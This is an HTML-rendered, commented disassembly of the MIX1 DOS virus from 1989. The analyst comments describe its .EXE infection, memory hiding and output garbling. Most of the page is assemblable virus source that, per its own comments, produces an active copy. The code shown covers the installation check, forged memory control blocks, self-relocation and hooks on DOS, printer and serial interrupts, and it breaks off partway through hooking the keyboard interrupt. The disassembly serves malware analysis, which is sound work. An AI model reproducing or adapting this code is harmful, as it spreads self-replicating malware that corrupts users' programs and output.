<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>MIX1.ASM</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;        THE MIX1 virus</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;        It was first detected in Israel in August '89.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;        Disassembly done Sept. 24-25 '89.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;        The author of this program is unknown, but it is clearly a</span><span class="sc0">
</span><span class="sc1">;        modification of the "Icelandic" virus, with considerable</span><span class="sc0">
</span><span class="sc1">;        additions</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;        All comments in this file were added by Fridrik Skulason,</span><span class="sc0">
</span><span class="sc1">;        University of Iceland/Computing Services.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;        INTERNET:     frisk@rhi.hi.is</span><span class="sc0">
</span><span class="sc1">;        UUCP:         ...mcvax!hafro!rhi!frisk</span><span class="sc0">
</span><span class="sc1">;        BIX:          FRISK</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;        To anyone who obtains this file - please be careful with it, I</span><span class="sc0">
</span><span class="sc1">;        would not like to see this virus be distributed too much.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;        A short description of the virus:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;        It only infects .EXE files. Infected files grow by ... to ... bytes.</span><span class="sc0">
</span><span class="sc1">;        The virus attaches itself to the end of the programs it infects.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;        When an infected file is run, the virus copies itself to top of</span><span class="sc0">
</span><span class="sc1">;        free memory, and modifies the memory blocks, in order to hide from</span><span class="sc0">
</span><span class="sc1">;        memory mapping programs. Some programs may overwrite this area,</span><span class="sc0">
</span><span class="sc1">;        causing the computer to crash.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;        The virus will hook INT 21H and when function 4B (EXEC) is called</span><span class="sc0">
</span><span class="sc1">;        it sometimes will infect the program being run. It will check every</span><span class="sc0">
</span><span class="sc1">;        tenth program that is run for infection, and if it is not already</span><span class="sc0">
</span><span class="sc1">;        infected, it will be.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;        The virus will remove the Read-Only attribute before trying to</span><span class="sc0">
</span><span class="sc1">;        infect programs.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;        Infected files can be easily recognized, since they always end in</span><span class="sc0">
</span><span class="sc1">;        "MIX1"</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;        To check for system infection, a byte at 0:33C is used - if it</span><span class="sc0">
</span><span class="sc1">;        contains 77 the virus is installed in memory.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">VIRSIZ</span><span class="sc0">        </span><span class="sc9">EQU</span><span class="sc0">        </span><span class="sc2">128</span><span class="sc0">
 
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       This is the original program, just used so this file, when</span><span class="sc0">
</span><span class="sc1">;       assembled, will produce an active copy.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">_TEXT1</span><span class="sc0">        </span><span class="sc9">SEGMENT</span><span class="sc0">        </span><span class="sc10">PARA</span><span class="sc0"> </span><span class="sc9">PUBLIC</span><span class="sc0">
</span><span class="sc5">_START</span><span class="sc0">        </span><span class="sc9">DB</span><span class="sc0">        </span><span class="sc2">0b4H</span><span class="sc4">,</span><span class="sc2">09H</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">        </span><span class="sc8">CS</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">        </span><span class="sc8">DS</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">        </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">STRING</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">        </span><span class="sc2">21H</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">        </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">4C00H</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">        </span><span class="sc2">21H</span><span class="sc0">
</span><span class="sc5">STRING</span><span class="sc0">        </span><span class="sc9">DB</span><span class="sc0">        </span><span class="sc3">"Hello world!"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc3">"$"</span><span class="sc0">
 </span><span class="sc5">_TEXT1</span><span class="sc0">        </span><span class="sc9">ENDS</span><span class="sc0">
 
</span><span class="sc5">CODE</span><span class="sc0"> </span><span class="sc9">SEGMENT</span><span class="sc0"> </span><span class="sc10">PARA</span><span class="sc0"> </span><span class="sc9">PUBLIC</span><span class="sc0"> </span><span class="sc12">'CODE'</span><span class="sc0">
        </span><span class="sc9">ASSUME</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">CODE</span><span class="sc4">,</span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc10">NOTHING</span><span class="sc4">,</span><span class="sc8">SS</span><span class="sc4">:</span><span class="sc10">NOTHING</span><span class="sc4">,</span><span class="sc8">ES</span><span class="sc4">:</span><span class="sc10">NOTHING</span><span class="sc0">
 
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;         The virus is basically divided in the following parts.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;        1. The main program - run when an infected program is run.</span><span class="sc0">
</span><span class="sc1">;           It will check if the system is already infected, and if not</span><span class="sc0">
</span><span class="sc1">;           it will install the virus.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;        2. The new INT 17 handler. All outgoing characters will be garbled.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;        3. The new INT 14 handler. All outgoing characters will be garbled.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;        4. The new INT 8 handler.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;        5. The new INT 9 handler. Disables the Num-Lock key</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;        6. The new INT 21 handler. It will look for EXEC calls, and</span><span class="sc0">
</span><span class="sc1">;           (sometimes) infect the program being run.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       Parts 1 and 6 are almost identical to the Icelandic-1 version</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;        This is a fake MCB</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">        </span><span class="sc12">'Z'</span><span class="sc4">,</span><span class="sc2">00</span><span class="sc4">,</span><span class="sc2">00</span><span class="sc4">,</span><span class="sc5">VIRSIZ</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
 
</span><span class="sc5">VIRUS</span><span class="sc0">   </span><span class="sc9">PROC</span><span class="sc0">    </span><span class="sc10">FAR</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;        The virus starts by pushing the original start address on the stack,</span><span class="sc0">
</span><span class="sc1">;        so it can transfer control there when finished.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">ABRAX</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">SP</span><span class="sc0">              </span><span class="sc1">; This used to be SUB SP,4</span><span class="sc0">
        </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">SP</span><span class="sc0">
        </span><span class="sc6">NOP</span><span class="sc0">
        </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">SP</span><span class="sc0">
        </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">SP</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">BP</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BP</span><span class="sc4">,</span><span class="sc8">SP</span><span class="sc0">
        </span><span class="sc6">NOP</span><span class="sc0">                     </span><span class="sc1">; added</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">NOP</span><span class="sc0">                     </span><span class="sc1">; added</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">ES</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;        Put the the original CS on the stack. The ADD AX,data instruction</span><span class="sc0">
</span><span class="sc1">;        is modified by the virus when it infects other programs.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">05H</span><span class="sc0">
</span><span class="sc5">ORG_CS</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0010H</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;        Put the the original IP on the stack. This MOV [BP+2],data instruction</span><span class="sc0">
</span><span class="sc1">;        is modified by the virus when it infects other programs.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0C7H</span><span class="sc4">,</span><span class="sc2">46H</span><span class="sc4">,</span><span class="sc2">02H</span><span class="sc0">
</span><span class="sc5">ORG_IP</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0000H</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;        Save all registers that are modified.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">SI</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DI</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;        Check if already installed. Quit if so.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">        </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                 </span><span class="sc1">; Was: XOR AX,AX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">        </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0">        </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc2">33CH</span><span class="sc4">],</span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc2">077H</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0">        </span><span class="sc5">L1</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;        Restore all registers and return to the original program.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">EXIT</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">POP</span><span class="sc0">        </span><span class="sc8">DI</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">        </span><span class="sc8">SI</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">        </span><span class="sc8">CX</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">        </span><span class="sc8">BX</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">        </span><span class="sc8">DS</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">        </span><span class="sc8">ES</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">        </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">        </span><span class="sc8">BP</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;    The virus tries to hide from detection by modifying the memory block it</span><span class="sc0">
</span><span class="sc1">;    uses, so it seems to be a block that belongs to the operating system.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;    It looks rather weird, but it seems to work.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">L1</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">52H</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">21H</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">                      </span><span class="sc1">; Two totally unnecessary instructions</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">                      </span><span class="sc1">; added</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc2">0003</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc2">0001</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;         Next, the virus modifies the memory block of the infected program.</span><span class="sc0">
</span><span class="sc1">;         It is made smaller, and no longer the last block.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">DS</span><span class="sc0">
        </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc0">                      </span><span class="sc1">; Unnecessary addition</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc12">'M'</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc2">0000</span><span class="sc4">],</span><span class="sc8">AL</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc2">0003</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc5">VIRSIZ</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc2">0003</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;         Then the virus moves itself to the new block.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc0">                      </span><span class="sc1">; Was: MOV ES,BX</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                    </span><span class="sc1">; Was: XOR SI,SI    XOR DI,DI</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc8">SI</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">652H</span><span class="sc0">
        </span><span class="sc6">CLD</span><span class="sc0">
        </span><span class="sc6">REP</span><span class="sc0">     </span><span class="sc6">MOVSB</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;        The virus then transfers control to the new copy of itself.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">      </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">L3</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       Zero some variables</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">L3</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">MIN60</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">NOP</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">MIN50</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">NOP</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">TIMER</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       The most nutty way to zero ES register that I have ever seen:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">0FFFFH</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">3F3FH</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc2">0AH</span><span class="sc0">
        </span><span class="sc6">SHL</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">CL</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">CONST0</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       Set flag to confirm installation</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc2">33CH</span><span class="sc4">],</span><span class="sc2">77H</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       Hook interrupt 21:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">        </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc2">0084H</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">        </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">OLD21</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">        </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc2">0086H</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">        </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">OLD21</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">        </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">        </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc2">0086H</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">        </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">NEW21</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">        </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc2">0084H</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       Hook interrupt 17:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">        </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc2">005CH</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">        </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">OLD17</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">        </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc2">005EH</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">        </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">OLD17</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">        </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">        </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc2">005EH</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">        </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">NEW17</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">        </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc2">005CH</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       Hook interrupt 14:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">        </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc2">0050H</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">        </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">OLD17</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">        </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc2">0052H</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">        </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">OLD14</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">        </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">        </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc2">0052H</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">        </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">NEW14</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">        </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc2">0050H</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">NOINF</span><span class="sc4">],</span><span class="sc2">5</span><span class="sc0">
        </span><span class="sc6">JG</span><span class="sc0">      </span><span class="sc5">HOOK9</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">EXIT</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       Hook interrupt 9</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">HOOK9</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">MOV</span><span class="sc0">        </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc2">0024H</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">        </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">OLD9</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">        </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc2">0026H</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">        </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">OLD9</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
